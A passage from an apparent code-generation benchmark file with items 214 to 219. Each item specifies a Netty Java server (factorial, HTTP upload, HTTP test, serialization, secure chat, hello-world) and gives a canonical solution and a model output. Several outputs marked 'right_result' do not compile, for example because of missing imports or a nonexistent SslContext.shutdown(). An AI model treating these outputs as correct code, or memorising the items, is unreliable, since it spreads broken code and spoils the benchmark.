exceptionCaught(ChannelHandlerContext ctx, Throwable cause) throws Exception {\n            LOGGER.error(\"Exception caught on channel: {}\", ctx.channel(), cause);\n            ctx.close();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 214,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework to handle client connections and process requests, with optional SSL support for secure communication.\n\nClass Description: FactorialServer is a Netty-based TCP server that listens on a specified port for incoming client connections. It supports optional SSL encryption and uses a boss-worker thread model for efficient connection handling. The server remains active until explicitly shut down, gracefully releasing all resources upon termination.\n\nAttributes:\n- SSL: [boolean] - Flag indicating whether SSL encryption should be enabled\n- PORT: [int] - The port number on which the server will listen for connections\n- sslCtx: [SslContext] - SSL context for secure communication (nullable)\n\nMethods:\n- main: [main(String[] args)] -> [void] - Entry point that initializes and starts the server. Handles SSL configuration if enabled, sets up event loop groups, configures server bootstrap, and manages server lifecycle.\n  - Input: String[] args - Command line arguments\n  - Output: void",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.logging.LogLevel;\nimport io.netty.handler.logging.LoggingHandler;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.util.SelfSignedCertificate;\n\npublic final class FactorialServer {\n\n    static final boolean SSL = System.getProperty(\"ssl\") != null;\n    static final int PORT = Integer.parseInt(System.getProperty(\"port\", \"8322\"));\n\n    public static void main(String[] args) throws Exception {\n        final SslContext sslCtx;\n        if (SSL) {\n            SelfSignedCertificate ssc = new SelfSignedCertificate();\n            sslCtx = SslContextBuilder.forServer(ssc.certificate(), ssc.privateKey()).build();\n        } else {\n            sslCtx = null;\n        }\n\n        EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .handler(new LoggingHandler(LogLevel.INFO))\n             .childHandler(new FactorialServerInitializer(sslCtx));\n\n            b.bind(PORT).sync().channel().closeFuture().sync();\n        } finally {\n            bossGroup.shutdownGracefully();\n            workerGroup.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.string.StringDecoder;\nimport io.netty.handler.codec.string.StringEncoder;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.util.SelfSignedCertificate;\n\npublic class FactorialServer {\n    private static final boolean SSL = System.getProperty(\"ssl\") != null;\n    private static final int PORT = Integer.parseInt(System.getProperty(\"port\", \"8007\"));\n\n    public static void main(String[] args) throws Exception {\n        SslContext sslCtx = null;\n        if (SSL) {\n            SelfSignedCertificate ssc = new SelfSignedCertificate();\n            sslCtx = SslContextBuilder.forServer(ssc.certificate(), ssc.privateKey()).build();\n        }\n\n        EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 public void initChannel(SocketChannel ch) throws Exception {\n                     ChannelPipeline p = ch.pipeline();\n                     if (sslCtx != null) {\n                         p.addLast(sslCtx.newHandler(ch.alloc()));\n                     }\n                     p.addLast(new StringDecoder());\n                     p.addLast(new StringEncoder());\n                     p.addLast(new FactorialServerHandler());\n                 }\n             })\n             .option(ChannelOption.SO_BACKLOG, 128)\n             .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            ChannelFuture f = b.bind(PORT).sync();\n            f.channel().closeFuture().sync();\n        } finally {\n            workerGroup.shutdownGracefully();\n            bossGroup.shutdownGracefully();\n        }\n    }\n}\n\nclass FactorialServerHandler extends SimpleChannelInboundHandler<String> {\n    @Override\n    protected void channelRead0(ChannelHandlerContext ctx, String msg) throws Exception {\n        // Process the request and send response\n        ctx.writeAndFlush(\"Response from server\");\n    }\n\n    @Override\n    public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) throws Exception {\n        cause.printStackTrace();\n        ctx.close();\n    }\n}\n```"
  },
  {
    "Task_id": 215,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework to handle HTTP file uploads, with optional SSL support for secure connections.\n\nClass Description: HttpUploadServer is a Netty-based server that listens for incoming HTTP connections and handles file upload requests. It supports both secure (HTTPS) and non-secure (HTTP) connections, configurable via system properties.\n\nAttributes:\n- SSL: boolean - Flag indicating whether SSL should be enabled (read from system property \"ssl\")\n- PORT: int - The port number the server will listen on (read from system property \"port\", defaults to 8443 for SSL or 8080 for non-SSL)\n\nMethods:\n- main(String[] args) -> void - Entry point of the application that sets up and runs the Netty server\n  - args: String[] - Command line arguments (not directly used)\n  - return: void\n\nThe method performs the following operations:\n1. Configures SSL context if SSL is enabled\n2. Creates event loop groups for handling connections\n3. Sets up server bootstrap with channel type and handlers\n4. Binds to the specified port and starts the server\n5. Keeps the server running until shutdown\n6. Cleans up resources on shutdown",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.logging.LogLevel;\nimport io.netty.handler.logging.LoggingHandler;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.util.SelfSignedCertificate;\n\npublic final class HttpUploadServer {\n\n    static final boolean SSL = System.getProperty(\"ssl\") != null;\n    static final int PORT = Integer.parseInt(System.getProperty(\"port\", SSL? \"8443\" : \"8080\"));\n\n    public static void main(String[] args) throws Exception {\n        final SslContext sslCtx;\n        if (SSL) {\n            SelfSignedCertificate ssc = new SelfSignedCertificate();\n            sslCtx = SslContextBuilder.forServer(ssc.certificate(), ssc.privateKey()).build();\n        } else {\n            sslCtx = null;\n        }\n\n        EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup);\n            b.channel(NioServerSocketChannel.class);\n            b.handler(new LoggingHandler(LogLevel.INFO));\n            b.childHandler(new HttpUploadServerInitializer(sslCtx));\n\n            Channel ch = b.bind(PORT).sync().channel();\n\n            System.err.println(\"Open your web browser and navigate to \" +\n                    (SSL? \"https\" : \"http\") + \"://127.0.0.1:\" + PORT + '/');\n\n            ch.closeFuture().sync();\n        } finally {\n            bossGroup.shutdownGracefully();\n            workerGroup.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelPipeline;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.http.HttpObjectAggregator;\nimport io.netty.handler.codec.http.HttpRequestDecoder;\nimport io.netty.handler.codec.http.HttpResponseEncoder;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.util.SelfSignedCertificate;\n\npublic class HttpUploadServer {\n    private static final boolean SSL = System.getProperty(\"ssl\") != null;\n    private static final int PORT = Integer.parseInt(System.getProperty(\"port\", SSL ? \"8443\" : \"8080\"));\n\n    public static void main(String[] args) throws Exception {\n        EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            SslContext sslCtx = null;\n            if (SSL) {\n                SelfSignedCertificate ssc = new SelfSignedCertificate();\n                sslCtx = SslContextBuilder.forServer(ssc.certificate(), ssc.privateKey()).build();\n            }\n\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 protected void initChannel(SocketChannel ch) throws Exception {\n                     ChannelPipeline p = ch.pipeline();\n                     if (sslCtx != null) {\n                         p.addLast(sslCtx.newHandler(ch.alloc()));\n                     }\n                     p.addLast(new HttpRequestDecoder());\n                     p.addLast(new HttpResponseEncoder());\n                     p.addLast(new HttpObjectAggregator(65536));\n                     p.addLast(new FileUploadHandler());\n                 }\n             });\n\n            ChannelFuture f = b.bind(PORT).sync();\n            f.channel().closeFuture().sync();\n        } finally {\n            workerGroup.shutdownGracefully();\n            bossGroup.shutdownGracefully();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 216,
    "Instruction": "Task Description: Create a Java class that implements an HTTP test server using Netty framework to handle incoming HTTP requests, process them with a custom handler, and return appropriate responses.\n\nClass Description: HttpTestServer is a Netty-based HTTP server designed for testing purposes. It handles incoming HTTP requests, processes them using a customizable request handler, and returns JSON responses. The server can be configured to simulate failures and include custom headers in responses.\n\nAttributes:\n- port: int - The port number on which the server will listen\n- fail: boolean - Flag to determine if server should respond with failure status\n- requestHandler: BiConsumer<HttpRequest, JsonGenerator> - Custom handler for processing requests and generating JSON responses\n- headers: Map<String, String> - Optional custom headers to include in responses\n- channel: Channel - Netty channel for server communication\n- group: NioEventLoopGroup - Netty event loop group for handling I/O operations\n- responses: List<String> - Stores all generated responses for testing purposes\n- JSON_FACTORY: JsonFactory - Static Jackson JSON factory for JSON processing\n\nMethods:\n- HttpTestServer(int port, boolean fail, BiConsumer<HttpRequest, JsonGenerator> requestHandler, Map<String, String> headers) - Constructor with all parameters\n- HttpTestServer(int port, boolean fail, BiConsumer<HttpRequest, JsonGenerator> requestHandler) - Constructor without headers parameter\n- run() -> void - Starts the server and binds it to the specified port\n- boundPort() -> int - Returns the actual port the server is bound to\n- shutDown() -> void - Gracefully shuts down the server and releases resources\n- HttpTestServerHandler (inner class) - Handles incoming HTTP requests and generates responses",
    "Canonical_solution": "import java.io.ByteArrayOutputStream;\nimport java.io.UnsupportedEncodingException;\nimport java.net.InetSocketAddress;\nimport java.nio.charset.StandardCharsets;\nimport java.util.ArrayList;\nimport java.util.List;\nimport java.util.Map;\nimport java.util.function.BiConsumer;\n\nimport org.apache.logging.log4j.LogManager;\nimport org.apache.logging.log4j.Logger;\nimport org.jetbrains.annotations.Nullable;\n\nimport com.fasterxml.jackson.core.JsonEncoding;\nimport com.fasterxml.jackson.core.JsonFactory;\nimport com.fasterxml.jackson.core.JsonGenerator;\nimport com.fasterxml.jackson.core.JsonParser;\n\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.buffer.ByteBuf;\nimport io.netty.buffer.Unpooled;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelFutureListener;\nimport io.netty.channel.ChannelHandler;\nimport io.netty.channel.ChannelHandlerContext;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelPipeline;\nimport io.netty.channel.SimpleChannelInboundHandler;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.http.DefaultFullHttpResponse;\nimport io.netty.handler.codec.http.DefaultHttpHeaders;\nimport io.netty.handler.codec.http.EmptyHttpHeaders;\nimport io.netty.handler.codec.http.HttpContentCompressor;\nimport io.netty.handler.codec.http.HttpHeaders;\nimport io.netty.handler.codec.http.HttpRequest;\nimport io.netty.handler.codec.http.HttpRequestDecoder;\nimport io.netty.handler.codec.http.HttpResponseEncoder;\nimport io.netty.handler.codec.http.HttpResponseStatus;\nimport io.netty.handler.codec.http.HttpVersion;\nimport io.netty.util.ReferenceCountUtil;\n\npublic class HttpTestServer {\n\n    private final int port;\n    private final boolean fail;\n    private final BiConsumer<HttpRequest, JsonGenerator> requestHandler;\n    private static final JsonFactory JSON_FACTORY;\n    private Channel channel;\n    private NioEventLoopGroup group;\n    public List<String> responses = new ArrayList<>();\n    @Nullable\n    private final Map<String, String> headers;\n\n    static {\n        JSON_FACTORY = new JsonFactory();\n        JSON_FACTORY.configure(JsonParser.Feature.ALLOW_UNQUOTED_FIELD_NAMES, true);\n        JSON_FACTORY.configure(JsonGenerator.Feature.QUOTE_FIELD_NAMES, true);\n        JSON_FACTORY.configure(JsonParser.Feature.ALLOW_COMMENTS, true);\n    }\n\n    public HttpTestServer(int port, boolean fail, BiConsumer<HttpRequest, JsonGenerator> requestHandler, @Nullable Map<String, String> headers) {\n        this.port = port;\n        this.fail = fail;\n        this.requestHandler = requestHandler;\n        this.headers = headers;\n    }\n\n    public HttpTestServer(int port, boolean fail, BiConsumer<HttpRequest, JsonGenerator> requestHandler) {\n        this(port, fail, requestHandler, null);\n    }\n\n    public void run() throws InterruptedException {\n        ServerBootstrap bootstrap = new ServerBootstrap();\n        group = new NioEventLoopGroup();\n        bootstrap.group(group);\n        bootstrap.channel(NioServerSocketChannel.class);\n        bootstrap.childHandler(new ChannelInitializer<Channel>() {\n            @Override\n            protected void initChannel(Channel ch) {\n                ChannelPipeline pipeline = ch.pipeline();\n                pipeline.addLast(\"decoder\", new HttpRequestDecoder());\n                pipeline.addLast(\"encoder\", new HttpResponseEncoder());\n                pipeline.addLast(\"deflater\", new HttpContentCompressor());\n                pipeline.addLast(\"handler\", new HttpTestServerHandler());\n            }\n        });\n        channel = bootstrap.bind(new InetSocketAddress(port)).sync().channel();\n    }\n\n    public int boundPort() {\n        InetSocketAddress localAddress = (InetSocketAddress) channel.localAddress();\n        return localAddress.getPort();\n    }\n\n    public void shutDown() {\n        channel.close().awaitUninterruptibly();\n        if (group != null) {\n            group.shutdownGracefully().awaitUninterruptibly();\n            group.terminationFuture().awaitUninterruptibly();\n            group = null;\n        }\n    }\n\n    @ChannelHandler.Sharable\n    public class HttpTestServerHandler extends SimpleChannelInboundHandler<Object> {\n        private final Logger logger = LogManager.getLogger(HttpTestServerHandler.class.getName());\n\n        @Override\n        protected void channelRead0(ChannelHandlerContext ctx, Object msg) throws Exception {\n            if (!(msg instanceof HttpRequest)) {\n                ctx.fireChannelRead(msg);\n                return;\n            }\n            try {\n                handleHttpRequest(ctx, (HttpRequest) msg);\n            } finally {\n                ReferenceCountUtil.release(msg);\n            }\n        }\n\n        private void handleHttpRequest(ChannelHandlerContext ctx, HttpRequest msg) throws UnsupportedEncodingException {\n            String uri = msg.uri();\n            logger.debug(\"Got Request for \" + uri);\n            HttpResponseStatus status = fail ? HttpResponseStatus.BAD_REQUEST : HttpResponseStatus.OK;\n            ByteArrayOutputStream out = new ByteArrayOutputStream();\n            try {\n                JsonGenerator generator = JSON_FACTORY.createGenerator(out, JsonEncoding.UTF8);\n                requestHandler.accept(msg, generator);\n            } catch (Exception ex) {\n                status = HttpResponseStatus.INTERNAL_SERVER_ERROR;\n            }\n            ByteBuf byteBuf = Unpooled.wrappedBuffer(out.toByteArray());\n            responses.add(out.toString(StandardCharsets.UTF_8));\n\n            DefaultFullHttpResponse response;\n            if (headers != null && headers.isEmpty() == false) {\n                HttpHeaders httpHeaders = new DefaultHttpHeaders();\n                for (var entries : headers.entrySet()) {\n                    httpHeaders.add(entries.getKey(), entries.getValue());\n                }\n                response = new DefaultFullHttpResponse(HttpVersion.HTTP_1_1, status, byteBuf, httpHeaders, EmptyHttpHeaders.INSTANCE);\n            } else {\n                response = new DefaultFullHttpResponse(HttpVersion.HTTP_1_1, status, byteBuf);\n            }\n\n            ChannelFuture future = ctx.channel().writeAndFlush(response);\n            future.addListener(ChannelFutureListener.CLOSE);\n        }\n\n        @Override\n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) throws Exception {\n            logger.warn(\"Unexpected exception from downstream.\", cause);\n            ctx.close();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.buffer.Unpooled;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.http.*;\nimport io.netty.handler.stream.ChunkedWriteHandler;\nimport com.fasterxml.jackson.core.JsonFactory;\nimport com.fasterxml.jackson.core.JsonGenerator;\n\nimport java.io.IOException;\nimport java.util.HashMap;\nimport java.util.List;\nimport java.util.Map;\nimport java.util.function.BiConsumer;\n\npublic class HttpTestServer {\n    private final int port;\n    private final boolean fail;\n    private final BiConsumer<HttpRequest, JsonGenerator> requestHandler;\n    private final Map<String, String> headers = new HashMap<>();\n    private Channel channel;\n    private NioEventLoopGroup group;\n    private final List<String> responses = List.of();\n    public static final JsonFactory JSON_FACTORY = new JsonFactory();\n\n    public HttpTestServer(int port, boolean fail, BiConsumer<HttpRequest, JsonGenerator> requestHandler, Map<String, String> headers) {\n        this.port = port;\n        this.fail = fail;\n        this.requestHandler = requestHandler;\n        this.headers.putAll(headers);\n    }\n\n    public HttpTestServer(int port, boolean fail, BiConsumer<HttpRequest, JsonGenerator> requestHandler) {\n        this(port, fail, requestHandler, new HashMap<>());\n    }\n\n    public void run() throws Exception {\n        group = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(group)\n             .channel(NioServerSocketChannel.class)\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 public void initChannel(SocketChannel ch) throws Exception {\n                     ChannelPipeline p = ch.pipeline();\n                     p.addLast(new HttpServerCodec());\n                     p.addLast(new ChunkedWriteHandler());\n                     p.addLast(new HttpObjectAggregator(65536));\n                     p.addLast(new HttpTestServerHandler());\n                 }\n             });\n\n            ChannelFuture f = b.bind(port).sync();\n            channel = f.channel();\n            f.channel().closeFuture().sync();\n        } finally {\n            group.shutdownGracefully();\n        }\n    }\n\n    public int boundPort() {\n        return channel.localAddress().getPort();\n    }\n\n    public void shutDown() {\n        if (channel != null) {\n            channel.close();\n        }\n        if (group != null) {\n            group.shutdownGracefully();\n        }\n    }\n\n    private class HttpTestServerHandler extends SimpleChannelInboundHandler<FullHttpRequest> {\n        @Override\n        protected void channelRead0(ChannelHandlerContext ctx, FullHttpRequest req) throws Exception {\n            HttpResponseStatus status = fail ? HttpResponseStatus.INTERNAL_SERVER_ERROR : HttpResponseStatus.OK;\n            FullHttpResponse response = new DefaultFullHttpResponse(HttpVersion.HTTP_1_1, status);\n\n            ByteBuf content = Unpooled.copiedBuffer(\"{}\", CharsetUtil.UTF_8);\n            response.content().writeBytes(content);\n            HttpHeaders.setContentLength(response, response.content().readableBytes());\n\n            if (!headers.isEmpty()) {\n                headers.forEach((key, value) -> response.headers().set(key, value));\n            }\n\n            ctx.writeAndFlush(response).addListener(ChannelFutureListener.CLOSE);\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 217,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework to handle incoming client connections and process serialized data.\n\nClass Description: SerializationServer is a Netty-based TCP server that listens on a specified port for incoming connections, processes serialized data through a custom pipeline, and manages server resources efficiently.\n\nAttributes:\nPORT: static final int - The port number on which the server will listen for incoming connections (default: 8082)\n\nMethods:\nstart(): void - Starts the Netty TCP server with the following behavior:\n1. Creates boss and worker event loop groups for connection handling\n2. Configures server bootstrap with NIO transport channel\n3. Sets server options (backlog and keepalive)\n4. Adds logging handler and custom pipeline initializer\n5. Binds to the specified port and waits for server shutdown\n6. Cleans up resources on shutdown\n\nInput: None (The port is defined as a class constant)\n\nOutput: None (The method runs indefinitely until server shutdown)\n\nNote: The class requires proper exception handling for server operations and resource cleanup in finally block. The actual data processing is handled by a separate SerializationServerInitializer class which should be provided separately.",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.logging.LogLevel;\nimport io.netty.handler.logging.LoggingHandler;\n\npublic final class SerializationServer {\n\n    static final int PORT = 8082;\n\n    public void start() throws Exception {\n        EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .option(ChannelOption.SO_BACKLOG, 100)\n             .childOption(ChannelOption.SO_KEEPALIVE, true)\n             .handler(new LoggingHandler(LogLevel.INFO))\n             .childHandler(new SerializationServerInitializer());\n\n            ChannelFuture f = b.bind(PORT).sync();\n            f.channel().closeFuture().sync();\n        } finally {\n            bossGroup.shutdownGracefully();\n            workerGroup.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelPipeline;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.logging.LogLevel;\nimport io.netty.handler.logging.LoggingHandler;\n\npublic class SerializationServer {\n    private static final int PORT = 8082;\n\n    public void start() {\n        EventLoopGroup bossGroup = new NioEventLoopGroup();\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .option(ChannelOption.SO_BACKLOG, 128)\n             .childOption(ChannelOption.SO_KEEPALIVE, true)\n             .handler(new LoggingHandler(LogLevel.INFO))\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 protected void initChannel(SocketChannel ch) throws Exception {\n                     ChannelPipeline p = ch.pipeline();\n                     // Add your SerializationServerInitializer here\n                 }\n             });\n\n            ChannelFuture f = b.bind(PORT).sync();\n            f.channel().closeFuture().sync();\n        } catch (InterruptedException e) {\n            Thread.currentThread().interrupt();\n        } finally {\n            workerGroup.shutdownGracefully();\n            bossGroup.shutdownGracefully();\n        }\n    }\n\n    public static void main(String[] args) {\n        new SerializationServer().start();\n    }\n}\n```"
  },
  {
    "Task_id": 218,
    "Instruction": "Task Description: Create a Java class that implements a secure TCP chat server using Netty framework, supporting SSL/TLS encryption for secure communication between clients and the server.\n\nClass Description: SecureChatServer is a Netty-based TCP server that handles secure chat communications. It initializes SSL context, configures server bootstrap with event loop groups, and manages server lifecycle including graceful shutdown.\n\nAttributes:\nPORT: int - The port number on which the server listens for incoming connections (default: 8992)\nsslCtx: SslContext - The SSL context used for secure communication\nbossGroup: EventLoopGroup - The parent event loop group that accepts incoming connections\nworkerGroup: EventLoopGroup - The child event loop group that handles the traffic of accepted connections\n\nMethods:\nmain: main(String[] args) -> void - Entry point that initializes SSL context, configures server, binds to port, and manages server lifecycle\n    - args: String[] - Command line arguments (unused in this implementation)\n    - No explicit return value (void)",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.logging.LogLevel;\nimport io.netty.handler.logging.LoggingHandler;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.util.SelfSignedCertificate;\n\npublic final class SecureChatServer {\n\n    static final int PORT = Integer.parseInt(System.getProperty(\"port\", \"8992\"));\n\n    public static void main(String[] args) throws Exception {\n        SelfSignedCertificate ssc = new SelfSignedCertificate();\n        SslContext sslCtx = SslContextBuilder.forServer(ssc.certificate(), ssc.privateKey())\n            .build();\n\n        EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .handler(new LoggingHandler(LogLevel.INFO))\n             .childHandler(new SecureChatServerInitializer(sslCtx));\n\n            b.bind(PORT).sync().channel().closeFuture().sync();\n        } finally {\n            bossGroup.shutdownGracefully();\n            workerGroup.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.util.SelfSignedCertificate;\n\npublic class SecureChatServer {\n    private static final int PORT = 8992;\n    private SslContext sslCtx;\n    private EventLoopGroup bossGroup;\n    private EventLoopGroup workerGroup;\n\n    public static void main(String[] args) throws Exception {\n        SecureChatServer server = new SecureChatServer();\n        try {\n            server.run();\n        } finally {\n            server.shutdownGracefully();\n        }\n    }\n\n    public void run() throws Exception {\n        SelfSignedCertificate ssc = new SelfSignedCertificate();\n        sslCtx = SslContextBuilder.forServer(ssc.certificate(), ssc.privateKey()).build();\n\n        bossGroup = new NioEventLoopGroup(1);\n        workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 public void initChannel(SocketChannel ch) throws Exception {\n                     ch.pipeline().addLast(sslCtx.newHandler(ch.alloc()));\n                     // Add other handlers here for chat protocol\n                 }\n             });\n\n            ChannelFuture f = b.bind(PORT).sync();\n            f.channel().closeFuture().sync();\n        } finally {\n            workerGroup.shutdownGracefully();\n            bossGroup.shutdownGracefully();\n        }\n    }\n\n    public void shutdownGracefully() {\n        if (bossGroup != null) {\n            bossGroup.shutdownGracefully();\n        }\n        if (workerGroup != null) {\n            workerGroup.shutdownGracefully();\n        }\n        if (sslCtx != null) {\n            sslCtx.shutdown();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 219,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework to handle HTTP requests, with optional SSL support for secure connections.\n\nClass Description: The HttpHelloWorldServer class is a Netty-based TCP server that listens for HTTP requests on a specified port. It supports both plain HTTP and HTTPS (when SSL is enabled) connections. The server uses a boss-worker thread model for handling connections and includes logging capabilities.\n\nAttributes:\n- SSL: static final boolean - Flag indicating whether SSL should be enabled\n- PORT: static final int - The port number on which the server will listen\n\nMethods:\n- start(): void - Starts the Netty TCP server. Throws Exception if any error occurs during startup.\n  - Input: None\n  - Output: None (but starts the server process)\n  - Description: Initializes SSL context if enabled, sets up event loop groups, configures server bootstrap with channel options and handlers, binds to the specified port, and keeps the server running until shutdown. Properly cleans up resources on shutdown.",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.logging.LogLevel;\nimport io.netty.handler.logging.LoggingHandler;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.util.SelfSignedCertificate;\n\npublic final class HttpHelloWorldServer {\n\n    static final boolean SSL = System.getProperty(\"ssl\") != null;\n    static final int PORT = Integer.parseInt(System.getProperty(\"port\", SSL? \"8443\" : \"8080\"));\n\n    public void start() throws Exception {\n        final SslContext sslCtx;\n        if (SSL) {\n            SelfSignedCertificate ssc = new SelfSignedCertificate();\n            sslCtx = SslContextBuilder.forServer(ssc.certificate(), ssc.privateKey()).build();\n        } else {\n            sslCtx = null;\n        }\n\n        EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.option(ChannelOption.SO_BACKLOG, 1024);\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .handler(new LoggingHandler(LogLevel.INFO))\n             .childHandler(new HttpHelloWorldServerInitializer(sslCtx));\n\n            Channel ch = b.bind(PORT).sync().channel();\n\n            System.err.println(\"Open your web browser and navigate to \" +\n                    (SSL? \"https\" : \"http\") + \"://127.0.0.1:\" + PORT + '/');\n\n            ch.closeFuture().sync();\n        } finally {\n            bossGroup.shutdownGracefully();\n            workerGroup.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
